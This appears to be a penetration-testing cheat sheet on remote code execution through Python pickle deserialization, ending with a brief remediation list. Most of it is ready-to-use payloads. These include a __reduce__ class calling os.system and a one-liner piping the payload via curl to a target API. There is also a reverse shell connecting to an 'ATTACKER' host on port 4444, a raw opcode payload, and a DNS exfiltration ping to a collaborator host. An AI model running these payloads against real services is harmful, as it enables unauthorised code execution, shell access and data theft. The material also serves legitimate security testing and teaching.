# Python Pickle Deserialization — __reduce__ RCE

## Summary
Python's `pickle.loads()` executes arbitrary code during deserialisation. The `__reduce__` method returns a callable + args tuple that `pickle` invokes automatically.

## Identification

### Protocol 0 (ASCII)
```
S'hello'
p0
.
```

### Protocol 2+ (binary, often base64)
```python
import pickle, base64
data = base64.b64decode(encoded_string)
# Check for \x80\x02 or \x80\x03 or \x80\x04 headers
```

### Common Locations
- API endpoints with `Content-Type: application/python-pickle`
- Redis session stores
- Machine learning model files (.pkl, .pickle)
- Celery task messages

## Manual Pickle Payload

```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

## Exploitation

### HTTP Request Injection
```bash
# Generate payload
python3 -c "
import pickle, base64
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
" | xargs -I{} curl -X POST https://target.com/api/data \
  -H "Content-Type: application/python-pickle" \
  --data-binary {}
```

### Reverse Shell
```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        cmd = 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'ATTACKER\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### Pickle Opcodes — Raw Construction
```python
import pickletools
import pickle

# Manual opcodes for os.system('id')
payload = b"cos\nsystem\n(S'id'\ntR."
pickletools.dis(payload)
# Shows: GLOBAL 'os system' / STRING 'id' / TUPLE1 / REDUCE
```

### Subprocess Variant (non-os)
```python
import pickle, base64

class RCE:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['id'],))

data = base64.b64encode(pickle.dumps(RCE())).decode()
```

## Blind Detection

When output is not visible:
```python
# Time-based
class RCE:
    def __reduce__(self):
        import time
        return (time.sleep, (10,))

# DNS exfiltration
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('ping -c 1 $(hostname).COLLABORATOR',))
```

## Remediation
- Never use `pickle.loads()` on untrusted data
- Use `json.loads()` or `yaml.safe_load()` instead
- If deserialisation is required, sandbox in a restricted container
- Validate HMAC signature before unpickling
